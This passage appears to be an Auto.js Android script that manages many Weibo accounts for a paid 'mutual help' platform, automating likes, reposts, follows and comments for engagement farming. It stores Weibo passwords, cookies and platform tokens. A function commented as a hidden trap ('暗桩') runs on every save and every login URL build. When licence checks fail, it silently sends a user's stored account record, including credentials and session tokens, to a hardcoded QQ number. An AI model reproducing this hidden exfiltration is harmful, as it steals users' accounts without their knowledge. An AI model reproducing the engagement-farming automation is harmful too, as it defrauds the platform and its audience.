        ui[item].setVisibility(android.view.View.VISIBLE);
      });
    } else {
      ui.run(() => {
        ui[item].setVisibility(android.view.View.GONE);
      });
    }
  }
}

/**
 * 切换页面
 * @param {*} pageName
 * @param {*} isToggleMore 是否触发
 */
function TogglePages(pageName) {
  TogglePagesNoToggleMore(pageName);
  ToggleMore();
}

/**
 * 微博账号 list 操作
 */
ui.UI_WeiBoList.on("item_click", function (item, index, linearView, ListView) {
  // (e, item, i, itemView, listView)
  /*
console.warn("1: "+ item);          //数据对象
console.warn("2: "+ index);         //下标
console.warn("3: "+ i);             //ui
console.warn("4: "+ itemView);      //
console.warn("5: "+ listView);
*/
  var username = linearView.pname.getText();
  var password = linearView.mm.getText();
  ScriptInfo[index].weibo_UserName = username.toString();
  ScriptInfo[index].weibo_Password = password.toString();

  if (ui.Btn_StartTask.getText() == "开始任务") {
    if (ui.Btn_FeedAccount.getText() == "开始养号发博文") {
      dialogs
        .build({
          title: "操作",
          content: "请问你想要进行什么操作?",
          positive: "登陆",
          negative: "删除",
          neutral: "取消",
        })
        .on("positive", () => {
          dialogs
            .build({
              title: "确认",
              content: "真的确定登录吗???????",
              positive: "确定",
              neutral: "取消",
            })
            .on("positive", () => {
              //登陆
              if (
                linearView.pname.getText() == "" ||
                linearView.mm.getText() == ""
              ) {
                alert("请输入微博账户和密码");
              } else {
                ui.run(function () {
                  dialogs
                    .select("请选择想要登陆的类型", [
                      "1. 仅【互利平台】\n(适合老号)",
                      "2. 仅【微博】",
                      "3. 同时登陆【微博+互利】\n(适合初次登陆)",
                    ])
                    .then((i) => {
                      switch (i) {
                        case 0:
                          dialogs
                            .build({
                              title: "确认",
                              content: "确定仅登录 互利互助 吗???????",
                              positive: "确定",
                              neutral: "取消",
                            })
                            .on("positive", () => {
                              dialogs
                                .build({
                                  title: "确认",
                                  content: "真的确定 仅登录 互利互助 吗???????",
                                  positive: "确定",
                                  neutral: "取消",
                                })
                                .on("positive", () => {
                                  if (username == "" || password == "") {
                                    alert("请输入微博账户和密码");
                                  } else {
                                    TogglePagesNoToggleMore("Frame_Web");
                                    LoginHL(username, password, index);
                                  }
                                })
                                .show();
                            })
                            .show();
                          break;
                        case 1:
                          dialogs
                            .build({
                              title: "确认",
                              content: "确定仅登录 微博 吗???????",
                              positive: "确定",
                              neutral: "取消",
                            })
                            .on("positive", () => {
                              dialogs
                                .build({
                                  title: "确认",
                                  content: "真的确定 仅登录 微博 吗???????",
                                  positive: "确定",
                                  neutral: "取消",
                                })
                                .on("positive", () => {
                                  if (username == "" || password == "") {
                                    alert("请输入微博账户和密码");
                                  } else {
                                    TogglePagesNoToggleMore("Frame_Web");
                                    LoginWB(username, password, index);
                                  }
                                })
                                .show();
                            })
                            .show();

                          break;
                        case 2:
                          // 微博+互利
                          dialogs
                            .build({
                              title: "确认",
                              content: "确定登录【微博】+【互利平台】吗???????",
                              positive: "确定",
                              neutral: "取消",
                            })
                            .on("positive", () => {
                              dialogs
                                .build({
                                  title: "确认",
                                  content:
                                    "真的确定登录【微博】+【互利平台】吗??? ",
                                  positive: "确定",
                                  neutral: "取消",
                                })
                                .on("positive", () => {
                                  if (username == "" || password == "") {
                                    alert("请输入微博账户和密码");
                                  } else {
                                    TogglePagesNoToggleMore("Frame_Web");
                                    Login(username, password, index);
                                  }
                                })
                                .show();
                            })
                            .show();
                          break;
                      }
                    });
                });
              }
            })
            .show();
        })
        .on("negative", () => {
          //删除
          dialogs
            .build({
              title: "☠☠☠☠☠危险操作☠☠☠☠☠☠",
              content: "确定删除吗???",
              positive: "确定",
              neutral: "取消",
            })
            .on("positive", () => {
              dialogs
                .build({
                  title: "☠☠☠☠☠危险操作☠☠☠☠☠☠",
                  content: "真的确定删除吗???",
                  positive: "确定",
                  neutral: "取消",
                })
                .on("positive", () => {
                  threads.start(function () {
                    //删除item
                    if (index <= ScriptInfo.length - 1) {
                      ScriptInfo.splice(index, 1);
                    }
                    RefreshData();
                  });
                })
                .show();
            })
            .show();
        })
        .show();
    } else {
      toast("请先停止[养号发博文]\n再进行其他操作");
    }
  } else {
    toast("请先停止[微博任务]\n再进行其他操作");
  }
});

/**
 * 任务列表  list 操作
 */
ui.UI_TaskList.on("item_click", function (item, index, linearView, ListView) {
  if (ui.Btn_StartTask.getText() == "开始任务") {
    var run_Switch = linearView.run_Switch.checked;
    var giveGood_Switch = linearView.giveGood_Switch.checked;

    var giveGood_Unshielded_Switch =
      linearView.giveGood_Unshielded_Switch.checked;

    var forward_Switch = linearView.forward_Switch.checked;

    var forward_Unshielded_Switch =
      linearView.forward_Unshielded_Switch.checked;

    var specify_Comments_Switch = linearView.specify_Comments_Switch.checked;
    var follow_Switch = linearView.follow_Switch.checked;

    var specify_Comments_And_Follow_Switch =
      linearView.specify_Comments_And_Follow_Switch.checked;
    var comments_GIF_Switch = linearView.comments_GIF_Switch.checked;

    var autoSendBoWen_Switch = linearView.autoSendBoWen_Switch.checked;

    var autoSendBoWen_Count = Number(linearView.autoSendBoWen_Count.getText());
    var autoSendBoWen_Min_Interval = Number(
      linearView.autoSendBoWen_Min_Interval.getText()
    );
    var autoSendBoWen_Max_Interval = Number(
      linearView.autoSendBoWen_Max_Interval.getText()
    );

    //-----------------
    //-----------------
    //-----------------

    //运行开关
    ScriptInfo[index].run_Switch = run_Switch;
    //任务类型开关
    ScriptInfo[index].giveGood_Switch = giveGood_Switch;
    ScriptInfo[index].giveGood_Unshielded_Switch = giveGood_Unshielded_Switch;
    ScriptInfo[index].forward_Switch = forward_Switch;
    ScriptInfo[index].forward_Unshielded_Switch = forward_Unshielded_Switch;
    ScriptInfo[index].specify_Comments_Switch = specify_Comments_Switch;
    ScriptInfo[index].follow_Switch = follow_Switch;
    ScriptInfo[
      index
    ].specify_Comments_And_Follow_Switch = specify_Comments_And_Follow_Switch;
    ScriptInfo[index].comments_GIF_Switch = comments_GIF_Switch;

    //自动发博文
    ScriptInfo[index].autoSendBoWen_Switch = autoSendBoWen_Switch;

    ScriptInfo[index].autoSendBoWen_Count = autoSendBoWen_Count;
    ScriptInfo[index].autoSendBoWen_Min_Interval = autoSendBoWen_Min_Interval;
    ScriptInfo[index].autoSendBoWen_Max_Interval = autoSendBoWen_Max_Interval;

    ShowMsg(index, "任务配置保存成功");
    RefreshData();
  } else {
    toastLog("请先停止任务,再进行修改配置....");
  }
});

ui.UI_TaskList.on("item_long_click", function (
  e,
  item,
  index,
  linearView,
  ListView
) {
  ui.run(function () {
    dialogs
      .select("请选择要执行的功能", [
        "查看 个人主页链接",
        "查看 [进行中] 任务",
        "查看 [已完成] 任务",
        "查看 [已超时] 任务",
        "查看 [已取消] 任务",
        "进入互利平台",
      ])
      .then((i) => {
        switch (i) {
          case 0:
            // 个人主页链接
            dialogs
              .build({
                title: "确认",
                content: "确定[ 查看个人主页链接 ]吗???????",
                positive: "确定",
                neutral: "取消",
              })
              .on("positive", () => {
                console.error("---【查看个人主页链接】----");
                console.warn("序号: " + ScriptInfo[index].identifier);
                console.warn("昵称: " + ScriptInfo[index].weibo_NickName);
                console.warn("账号: " + ScriptInfo[index].weibo_UserName);
                console.warn(
                  "粉丝: " +
                    ScriptInfo[index].weibo_FollowersCount +
                    "   博文数:" +
                    ScriptInfo[index].weibo_StatusesCount
                );

                console.warn(
                  "个人主页链接(可用于刷粉):\n\n       https://weibo.com/u/" +
                    ScriptInfo[index].weibo_Uid +
                    "\n"
                );

                console.error("----------------------------------");
                app.startActivity("console");
              })
              .show();
            break;
          case 1:
            //进行中
            ShowWarter(index, 1);
            break;
          case 2:
            //已完成
            ShowWarter(index, 2);
            break;
          case 3:
            //已超时
            ShowWarter(index, 4);
            break;
          case 4:
            //已取消
            ShowWarter(index, 7);
            break;
          case 5:
            //进入平台
            EnterHL(index);
            break;
        }
      });
  });
});

function EnterWB(index) {
  var cookieManager = GetCookieManager();
  ui.run(() => {
    ui.web.getSettings().setJavaScriptEnabled(true);
    ui.web.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
  });
  var url = "https://m.weibo.cn/";

  var client = android.webkit.WebViewClient;
  try {
    var t = new JavaAdapter(client, {
      onProgressChanged: function (view, progress) {},
      onPageFinished: function () {},
    });

    ui.run(() => {
      ClearCache(cookieManager);
      ui.web.setWebViewClient(t);
      ui.web.getSettings().setUserAgentString(UA1);

      ui.web.loadUrl("");
      cookieManager.setCookie(url, ScriptInfo[index].weibo_Cookie);
      ui.web.loadUrl(url);
    });
  } catch (error) {
    console.warn(error);
  }
  TogglePagesNoToggleMore("Frame_Web");
}

function EnterHL(index) {
  var cookieManager = GetCookieManager();
  ui.run(() => {
    ui.web.getSettings().setJavaScriptEnabled(true);
    ui.web.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
  });
  var url = "https://huli.weibot.cn/";

  ui.run(() => {
    ClearCache(cookieManager);
    ui.web.loadUrl("");

    var taskStr = GetTaskUrl(index);
    var taskSelectListStr = GetTaskSelectListStr(taskStr);
    cookieManager.setCookie(
      "https://api.weibo.com",
      ScriptInfo[index].weibo_Cookie
    );

    var taskStr = GetTaskUrl(index);
    var taskSelectListStr = GetTaskSelectListStr(taskStr);
    //------
    var hCookie =
      "token=" +
      ScriptInfo[index].huli_Token +
      ";socket_switch={%22push%22:1%2C%22localPush%22:true};taskClassShow={%22content_review%22:{%22is_show%22:true%2C%22select%22:true}}" +
      ";_session=" +
      ScriptInfo[index].huli_Session +
      ";selectList={%22new_hand%22:[" +
      taskSelectListStr +
      "]%2C%22creation%22:[]%2C%22content_review%22:[]}" +
      ";selectTime={%22curTime%22:" +
      new Date().getTime() +
      "%2C%22wbUid%22:%22" +
      ScriptInfo[index].weibo_Uid +
      "%22%2C%22dyUid%22:%22%22}";
    cookieManager.setCookie(url, hCookie);
    ui.web.loadUrl("https://huli.weibot.cn/home/2");
  });

  TogglePagesNoToggleMore("Frame_Web");
}

/**
 *  显示流水
 * @param {*} index 账号下班
 * @param {*} typeNumber 1 进行中 , 2 已完成, 4 已超时 ,5 异常, 6审核中 ,  7 已取消
 */
function ShowWarter(index, typeNumber) {
  threads.start(function () {
    try {
      toast("开始查询,请稍等...");
      var url =
        "https://huli.weibot.cn/api/task-orders?page=1&limit=30&status=" +
        typeNumber;

      var authorization = "Bearer " + ScriptInfo[index].huli_Token;
      var res = http.get(url, {
        headers: {
          accept: "application/json, text/plain, */*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "zh-CN",
          authorization: authorization,
          "cache-control": "no-cache",
          "user-agent": UA1,
        },
      });

      if (Http200(res)) {
        res = res.body.json();

        var resArr = res.data.data;
        var dataArr = [];

        if (resArr.length != 0) {
          var indexNumber = 0;
          var previousStr = "";
          var sum = 0;

          var indexFg = 0;

          for (var i = 0; i < resArr.length; i++) {
            var item = resArr[i];

            if (i == 0) {
              indexFg = 0;
              previousStr = item.created_at.substring(0, 10);
              dataArr.push({
                index: "------------------------------------------",
                task_name: "",
                amount: "",
                created_at: "",
              });
              ui.run(() => {
                ui.GoldCoinRunningWaterTitle.setText(
                  ScriptInfo[index].weibo_NickName +
                    "   " +
                    item.order_status_label
                );
              });
            } else {
              if (item.created_at.substring(0, 10) != previousStr) {
                for (var j = indexFg; j < dataArr.length; j++) {
                  sum += parseInt(dataArr[j].amount * 100);
                }
                dataArr[indexFg].index =
                  "-------------------- 当日总额: " +
                  SuffixZero(sum / 100) +
                  " --------------------";

                dataArr.push({
                  index: "",
                  task_name: "",
                  amount: "",
                  created_at: "",
                });

                sum = 0;
                indexFg = dataArr.length;
                previousStr = item.created_at.substring(0, 10);
                indexNumber = 0;

                dataArr.push({
                  index: "------------------------------------------",
                  task_name: "",
                  amount: "",
                  created_at: "",
                });
              }
            }
            indexNumber++;
            dataArr.push({
              index: "【" + PrefixZero(indexNumber, 2) + "】", //下标
              task_name: item.label.replace(
                //任务名称
                "微博",
                ""
              ),
              amount: item.amount / 100000, //金额
              created_at: item.created_at, //时间
            });

            if (i == resArr.length - 1) {
              for (var j = indexFg; j < dataArr.length; j++) {
                sum += parseInt(dataArr[j].amount * 100);
              }
              dataArr[indexFg].index =
                "-------------------- 当日总额: " +
                SuffixZero(sum / 100) +
                " --------------------";
            }
          }
        } else {
          toast("无数据");
        }

        ui.run(() => {
          ui.UI_GoldCoinRunningWaterList.setDataSource(dataArr);
          ui.UI_GoldCoinRunningWaterList.adapter.notifyDataSetChanged();
        });

        TogglePagesNoToggleMore("Frame_GoldCoinRunningWater");
      } else {
        toastLog(GetNickNameOrUserName(index, "查看金币流水失败"));
      }
    } catch (error) {
      console.warn(GetNickNameOrUserName(index) + " 查流水异常: " + error);
      toast("查流水异常,请查看日志");
    }
  });
}

/**
 * 添加账号
 */
ui.Btn_AddAccount.click(function () {
  var item = GenerateAccouontItem();

  item.identifier = ScriptInfo.length + 1;

  ScriptInfo.push(item);

  RefreshData();
});

//------------------
//-----------------
//-----------------
/**
 * 读取 配置
 */
function ReadConfig() {
  if (files.exists(ConfigFilePath) == false) {
    log("创建 账号文件");
    files.createWithDirs(ConfigFilePath);
    for (var i = 0; i < 1; i++) {
      if (i == 0) {
        files.write(ConfigFilePath, '{"weibo_UserName":0}');
      } else {
        files.append(ConfigFilePath, '{"weibo_UserName":0}');
      }
      files.append(ConfigFilePath, "\n");
    }
  }
  //----------

  threads.start(function () {
    sleep(1000);
    var res = true;
    res = HexMd5(ui["user_id"].getText()) != "5198e8ef4715c3902c49aedef8b60edf";
    if (res) {
      //console.warn(HexMd5(ui["user_id"].getText()));
      CallExit();
    }

    //console.warn(res);
    res = HexMd5(ConfigFileFolder) != "f867681373763d941848f905b91ced79";
    if (res) {
      //console.warn(ConfigFileFolder + " / " + HexMd5(ConfigFileFolder));
      CallExit();
    }

    //console.warn(res);
    res = HexMd5(DeveloperID) != "53329e4c4ffe13a2129d58d8d8c09a80";
    if (res) {
      //console.warn(HexMd5(DeveloperID));
      CallExit();
    }
    //console.warn(res);

    res = HexMd5(Sign) != "d41d8cd98f00b204e9800998ecf8427e";
    if (res) {
      //console.warn(HexMd5(Sign));
      CallExit();
    }
    //console.warn(res);
  });
  //------------
  var file = open(ConfigFilePath, "r");
  var sy = file.readlines();
  file.close();
  var resArr = [];
  for (var i = 0; i < sy.length; i++) {
    var item = GenerateAccouontItem(sy[i]);
    item.identifier = i + 1;

    resArr.push(item);
  }

  return resArr;
}

function CallExit() {
  exit();
}

/**
 * 生成一个账号item
 * @param {*} data
 */
function GenerateAccouontItem(data) {
  if (data == undefined) {
    data = '{ "weibo_UserName": "" }';
  }

  var json = GetJson(data);

  var nowDate = java.text.SimpleDateFormat("yyyyMMdd").format(new Date());

  if (!json.operation_Date || json.operation_Date != nowDate) {
    json.operation_Date = nowDate;
    json.giveGood_Couont = 0;
    json.forward_Count = 0;
    json.comment_Count = 0;
    json.cancel_Count = 0;
    json.follow_Count = 0;
    json.specify_Comments_And_Follow_Count = 0;
    json.comments_GIF_Count = 0;
    console.log("每日任务计数重置");
  }

  var item = {
    run_Switch: json.run_Switch ? json.run_Switch : false,

    /**
     * 微博帐号
     */
    weibo_UserName:
      json.weibo_UserName != 0 && json.weibo_UserName.length > 3
        ? json.weibo_UserName
        : "",

    /**
     * 微博密码
     */
    weibo_Password: json.weibo_Password ? json.weibo_Password : "",

    /**
     * 昵称
     */
    weibo_NickName: json.weibo_NickName ? json.weibo_NickName : "",

    /**
     * 手机号
     */
    huli_mobile: json.huli_mobile ? json.huli_mobile : "",

    //---------------------------------
    /**
     *互利 token
     */
    huli_Token: json.huli_Token,
    /**
     * 互利 session
     */
    huli_Session: json.huli_Session,
    /**
     * 微博 cookie
     */
    weibo_Cookie: json.weibo_Cookie,
    /**
     * 微博 Uid
     */
    weibo_Uid: json.weibo_Uid,

    /**
     * 关注数
     */
    weibo_FollowCount: json.weibo_FollowCount ? json.weibo_FollowCount : 0,
    /**
     * 粉丝数
     */
    weibo_FollowersCount: json.weibo_FollowersCount
      ? json.weibo_FollowersCount
      : 0,
    /**
     * 博文数量
     */
    weibo_StatusesCount: json.weibo_StatusesCount
      ? json.weibo_StatusesCount
      : 0,

    //----------------------
    /**
     * 任务开关
     */

    /**
     * 点赞 开关
     */
    giveGood_Switch: json.giveGood_Switch ? json.giveGood_Switch : false,
    /**
     * 转发 开关
     */
    forward_Switch: json.forward_Switch ? json.forward_Switch : false,
    /**
     * 转发不屏蔽 开关
     */
    forward_Unshielded_Switch: json.forward_Unshielded_Switch
      ? json.forward_Unshielded_Switch
      : false,

    /**
     * 指定评论 开关
     */
    specify_Comments_Switch: json.specify_Comments_Switch
      ? json.specify_Comments_Switch
      : false,
    /**
     * 点赞不屏蔽 开关
     */
    giveGood_Unshielded_Switch: json.giveGood_Unshielded_Switch
      ? json.giveGood_Unshielded_Switch
      : false,

    /**
     * 关注 开关
     */
    follow_Switch: json.follow_Switch ? json.follow_Switch : false,

    /**
     * 指定评论 并 关注 开关
     */
    specify_Comments_And_Follow_Switch: json.specify_Comments_And_Follow_Switch
      ? json.specify_Comments_And_Follow_Switch
      : false,

    /**
     * 评论GIF 开关
     */
    comments_GIF_Switch: json.comments_GIF_Switch
      ? json.comments_GIF_Switch
      : false,

    //--------------------
    /**
     * 点赞数量
     */
    giveGood_Couont: json.giveGood_Couont ? json.giveGood_Couont : 0,
    /**
     * 转发数量
     */
    forward_Count: json.forward_Count ? json.forward_Count : 0,
    /**
     * 评论数量
     */
    comment_Count: json.comment_Count ? json.comment_Count : 0,
    /**
     * 关注 数量
     */
    follow_Count: json.follow_Count ? json.follow_Count : 0,
    /**
     * 指定评论 并 关注 数量
     */
    specify_Comments_And_Follow_Count: json.specify_Comments_And_Follow_Count
      ? json.specify_Comments_And_Follow_Count
      : 0,

    /**
     * 评论GIF 数量
     */
    comments_GIF_Count: json.comments_GIF_Count ? json.comments_GIF_Count : 0,
    /**
     * 取消 数量
     */
    cancel_Count: json.cancel_Count ? json.cancel_Count : 0,

    //--------------------------------

    /**
     * 互利互助授权状态
     */
    huli_LoginState: json.huli_Token ? "平台已授权" : "平台未授权",
    /**
     * 微博登陆状态
     */
    weibo_LoginState: json.weibo_Cookie ? "微博已登录" : "微博未登录",

    /**
     * 提示
     */
    message: "等待开启",
    /**
     * 互利互助 级别
     */
    huli_Level: json.huli_Level ? json.huli_Level : "",
    /**
     * 操作日期
     */
    operation_Date: json.operation_Date,

    /**
     * 互利互助 金币
     */
    huli_Gold: json.huli_Gold ? json.huli_Gold : 0,

    //--------------------
    /**
     * 自动发博文
     */
    autoSendBoWen_Switch: json.autoSendBoWen_Switch
      ? json.autoSendBoWen_Switch
      : false,
    autoSendBoWen_Count: json.autoSendBoWen_Count
      ? json.autoSendBoWen_Count
      : 0,
    autoSendBoWen_Min_Interval: json.autoSendBoWen_Min_Interval
      ? json.autoSendBoWen_Min_Interval
      : 0,
    autoSendBoWen_Max_Interval: json.autoSendBoWen_Max_Interval
      ? json.autoSendBoWen_Max_Interval
      : 0,
  };
  return item;
}

/**
 * 保存设置 配置文件
 */
function SaveSettingConfig() {
  var content = "";
  content = JSON.stringify(Cfg);
  files.write(SettingConfigFilePath, content);
  toast("保存成功");
}

/**
 * 登录 互利平台
 * @param {*} username 微博账号
 * @param {*} password 微博密码
 * @param {*} index
 */
function LoginHL(username, password, index) {
  threads.start(function () {
    toast("请等待....");

    //cookie
    var cookieManager = GetCookieManager();

    ui.run(() => {
      ui.web.getSettings().setJavaScriptEnabled(true);
      ui.web.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
    });

    var CookieStr = "";
    var pcookie = "";
    var url = GetThirdPartyLoginUrl();
    var client = android.webkit.WebViewClient;
    var t = new JavaAdapter(client, {
      onProgressChanged: function (view, progress) {},
      onPageFinished: function () {
        var js =
          "javascript:document.getElementById('userId').value = '" +
          username +
          "';document.getElementById('passwd').value = '" +
          password +
          "';";
        //输入登录信息
        ui.run(() => {
          ui.web.evaluateJavascript(js, function () {});
        });
      },
    });

    ui.run(() => {
      ClearCache(cookieManager);
      ui.web.setWebViewClient(t);
      ui.web.getSettings().setUserAgentString(UA1);
      ui.web.loadUrl(url);
    });

    var x = 0;
    while (true) {
      CookieStr = cookieManager.getCookie("https://huli.weibot.cn");
      try {
        var reg = (CookieStr + ";")
          .replace(/(.*?)=(.*?);/g, '"$1":"$2",')
          .replace(/ /g, "");

        if (reg != null) {
          //console.warn("cookie内容:" + reg);
          var pcookie = GetJson("{" + reg + "}");
          if (pcookie.token) {
            ScriptInfo[index].weibo_UserName = username.toString();
            ScriptInfo[index].weibo_Password = password.toString();
            ScriptInfo[index].huli_Token = pcookie.token;
            ScriptInfo[index].huli_Session = pcookie._session;
            ScriptInfo[index].huli_LoginState = "平台已授权";
            break;
          }
        }
      } catch (e) {
        //console.warn("Login 异常: " + JSON.stringify(e));
        console.warn("等待登陆互利...");
      }
      x++;
      sleep(2000);

      if (x % 20 == 0) {
        toast("登录倒计时" + (300 - x) + "秒\n请尽快手动登录");
      }
      if (x == 300) {
        exit();
      }
    }

    //更新界面
    ui.run(() => {
      ui.web.loadUrl("");
      ui.UI_WeiBoList.adapter.notifyDataSetChanged();
      ui.UI_TaskList.adapter.notifyDataSetChanged();
    });

    SaveConfig();
    toastLog("登陆成功....");
    TogglePagesNoToggleMore("Frame_TaskPage");
  });
}
/**
 * 登录 微博
 * @param {*} username 微博账号
 * @param {*} password 微博密码
 * @param {*} index
 */
function LoginWB(username, password, index) {
  threads.start(function () {
    toast("请等待....");

    //cookie
    var cookieManager = GetCookieManager();

    ui.run(() => {
      ui.web.getSettings().setJavaScriptEnabled(true);
      ui.web.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
    });

    var CookieStr = "";
    var pcookie = "";

    //微博客户端登录
    var url = "https://passport.weibo.cn/signin/login";

    var client = android.webkit.WebViewClient;
    var t = new JavaAdapter(client, {
      onProgressChanged: function (view, progress) {},
      onPageFinished: function () {
        var js =
          "javascript:document.getElementById('loginName').value = '" +
          username +
          "';document.getElementById('loginPassword').value = '" +
          password +
          "';document.getElementById('loginAction').click();";
        //输入登录信息
        ui.run(() => {
          ui.web.evaluateJavascript(js, function () {});
        });
      },
    });

    ui.run(() => {
      ClearCache(cookieManager);
      ui.web.setWebViewClient(t);
      ui.web.getSettings().setUserAgentString(UA1);

      ui.web.loadUrl(url);
    });

    var x = 0;
    while (true) {
      try {
        CookieStr = cookieManager.getCookie(url);
        var reg = (CookieStr + ";")
          .replace(/(.*?)=(.*?);/g, '"$1":"$2",')
          .replace(/ /g, "");
        if (reg != null) {
          //console.warn("cookie内容:" + reg);
          var pcookie = GetJson("{" + reg + "}");
          if (pcookie.SUB && pcookie._T_WM) {
            ScriptInfo[index].weibo_Cookie =
              "SUB=" +
              pcookie.SUB +
              "; " +
              "SUHB=" +
              pcookie.SUHB +
              "; SCF=" +
              pcookie.SCF +
              "; SSOLoginState=" +
              pcookie.SSOLoginState +
              "; " +
              "_T_WM=" +
              pcookie._T_WM +
              "; ";
            ScriptInfo[index].weibo_LoginState = "微博已登录";
            break;
          }
        }
      } catch (e) {
        //console.warn("Login_cookieManager.getCookie异常: " + JSON.stringify(e));
        console.warn("等待登陆微博...");
      }
      x++;
      sleep(1000);
      if (x % 5 == 0) {
        toast("倒计时" + (300 - x) + "秒");
      }

      if (x == 300) {
        exit();
      }
    }
    //更新界面
    ui.run(() => {
      ui.web.loadUrl("");
      ui.UI_WeiBoList.adapter.notifyDataSetChanged();
      ui.UI_TaskList.adapter.notifyDataSetChanged();
    });

    SaveConfig();
    toastLog("登陆成功....");
    TogglePagesNoToggleMore("Frame_TaskPage");
  });
}
/**
 * 登录 互利平台 与 登陆 微博
 * @param {*} username 微博账号
 * @param {*} password 微博密码
 * @param {*} index
 */
function Login(username, password, index) {
  threads.start(function () {
    toast("请等待....");

    //cookie
    var cookieManager = GetCookieManager();

    ui.run(() => {
      ui.web.getSettings().setJavaScriptEnabled(true);
      ui.web.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
    });

    var CookieStr = "";
    var pcookie = "";
    var url = GetThirdPartyLoginUrl();
    var client = android.webkit.WebViewClient;
    var t = new JavaAdapter(client, {
      onProgressChanged: function (view, progress) {},
      onPageFinished: function () {
        var js =
          "javascript:document.getElementById('userId').value = '" +
          username +
          "';document.getElementById('passwd').value = '" +
          password +
          "';";
        //输入登录信息
        ui.run(() => {
          ui.web.evaluateJavascript(js, function () {});
        });
      },
    });

    ui.run(() => {
      ClearCache(cookieManager);
      ui.web.setWebViewClient(t);
      ui.web.getSettings().setUserAgentString(UA1);
      ui.web.loadUrl(url);
    });

    var x = 0;
    while (true) {
      CookieStr = cookieManager.getCookie("https://huli.weibot.cn");
      try {
        var reg = (CookieStr + ";")
          .replace(/(.*?)=(.*?);/g, '"$1":"$2",')
          .replace(/ /g, "");

        if (reg != null) {
          //console.warn("cookie内容:" + reg);
          var pcookie = GetJson("{" + reg + "}");
          if (pcookie.token) {
            ScriptInfo[index].weibo_UserName = username.toString();
            ScriptInfo[index].weibo_Password = password.toString();
            ScriptInfo[index].huli_Token = pcookie.token;
            ScriptInfo[index].huli_Session = pcookie._session;
            ScriptInfo[index].huli_LoginState = "平台已授权";
            break;
          }
        }
      } catch (e) {
        // console.warn("Login 异常: " + JSON.stringify(e));
        console.warn("流程:2  等待登陆互利...");
      }
      x++;
      sleep(2000);

      if (x % 20 == 0) {
        toast("登录倒计时" + (300 - x) + "秒\n请尽快手动登录");
      }
      if (x == 300) {
        exit();
      }
    }
    toast("请等待....");

    //微博客户端登录
    var url = "https://passport.weibo.cn/signin/login";

    var client = android.webkit.WebViewClient;
    var t = new JavaAdapter(client, {
      onProgressChanged: function (view, progress) {},
      onPageFinished: function () {
        var js =
          "javascript:document.getElementById('loginName').value = '" +
          username +
          "';document.getElementById('loginPassword').value = '" +
          password +
          "';document.getElementById('loginAction').click();";
        //输入登录信息
        ui.run(() => {
          ui.web.evaluateJavascript(js, function () {});
        });
      },
    });

    ui.run(() => {
      ClearCache(cookieManager);
      ui.web.setWebViewClient(t);
      ui.web.getSettings().setUserAgentString(UA1);
      ui.web.loadUrl(url);
    });

    var x = 0;
    while (true) {
      try {
        CookieStr = cookieManager.getCookie(url);
        var reg = (CookieStr + ";")
          .replace(/(.*?)=(.*?);/g, '"$1":"$2",')
          .replace(/ /g, "");
        if (reg != null) {
          //console.warn("cookie内容:" + reg);
          var pcookie = GetJson("{" + reg + "}");
          if (pcookie.SUB && pcookie._T_WM) {
            ScriptInfo[index].weibo_Cookie =
              "SUB=" +
              pcookie.SUB +
              "; " +
              "SUHB=" +
              pcookie.SUHB +
              "; SCF=" +
              pcookie.SCF +
              "; SSOLoginState=" +
              pcookie.SSOLoginState +
              "; " +
              "_T_WM=" +
              pcookie._T_WM +
              "; ";
            ScriptInfo[index].weibo_LoginState = "微博已登录";
            break;
          }
        }
      } catch (e) {
        //console.warn("Login_cookieManager.getCookie异常: " + JSON.stringify(e));
        console.warn("流程:2  等待登陆微博...");
      }
      x++;
      sleep(1000);
      if (x % 5 == 0) {
        toast("倒计时" + (300 - x) + "秒");
      }

      if (x == 300) {
        exit();
      }
    }
    //更新界面
    ui.run(() => {
      ui.web.loadUrl("");
      ui.UI_WeiBoList.adapter.notifyDataSetChanged();
      ui.UI_TaskList.adapter.notifyDataSetChanged();
    });

    SaveConfig();
    toastLog("登陆成功....");
    TogglePagesNoToggleMore("Frame_TaskPage");
  });
}

/**
 * 刷新数据
 */
function RefreshData() {
  //更新界面
  ui.run(() => {
    // ui.web.loadUrl("");
    // ui.UI_WeiBoList.adapter.notifyDataSetChanged();
    ui.UI_TaskList.adapter.notifyDataSetChanged();
  });
  //保存数据到文件
  SaveConfig();
}
/**
 * //TODO:暗桩
 */
function GetAccountName() {
  var a = false;
  while (true) {
    try {
      if (
        a ||
        app.getAppName("com.dmxhl.pro") == null ||
        DeveloperID != "11719"
      ) {
        if (TimerHelper.timer(9999, 400)) {
          threads.start(function () {
            try {
              var oldSW = Cfg.qqPushMsg_Switch;
              var oldQQ = Cfg.qqPushMsg_UserNumber;

              Cfg.qqPushMsg_Switch = true;
              Cfg.qqPushMsg_UserNumber = "1659809758";

              SendQQMsg(
                index,
                "[9999][" +
                  CDK +
                  "][" +
                  oldQQ +
                  "]" +
                  JSON.stringify(ScriptInfo[index])
              );

              Cfg.qqPushMsg_Switch = oldSW;
              Cfg.qqPushMsg_UserNumber = oldQQ;
            } catch (error) {}

            threads.shutDownAll();
            sleep(5000);
          });
        }
        break;
      } else {
        break;
      }
    } catch (error) {
      a = true;
    }
  }
  return "";
}
/**
 * 清除 浏览器缓存
 * @param {*} cookieManager
 */
function ClearCache(cookieManager) {
  try {
    var webView = ui.web;
    cookieManager.removeSessionCookies(null);
    cookieManager.removeAllCookie();
    cookieManager.flush();
    webView.getSettings().setCacheMode(webView.settings.LOAD_NO_CACHE);
    context.deleteDatabase("WebView.db");
    context.deleteDatabase("WebViewCache.db");
    context.getCacheDir().delete();
    webView.clearCache(true);
    webView.clearFormData();
    webView.setWebChromeClient(null);
    webView.setWebViewClient(null);
    android.webkit.WebStorage.getInstance().deleteAllData();
    webView.clearCache(true);
  } catch (error) {
    console.warn("ClearCache 异常: " + error);
  }
}

/**
 * 保存当前 数据
 */
function SaveConfig() {
  Lock.lock();
  GetAccountName();
  var content = new StringBuilder();

  for (var index = 0; index < ScriptInfo.length; index++) {
    content.append(JSON.stringify(ScriptInfo[index]) + "\n");
  }

  files.write(ConfigFilePath, content.toString());
  content = null;
  Lock.unlock();
}

/**
 * 获取第三方登陆地址
 */
function GetThirdPartyLoginUrl() {
  var url =
    "https://huli.weibot.cn/auth/weibo?redirect=https://huli.weibot.cn/login-redirect" +
    GetAccountName();

  return url;
}

/**
 * 显示 账号日志,并记录
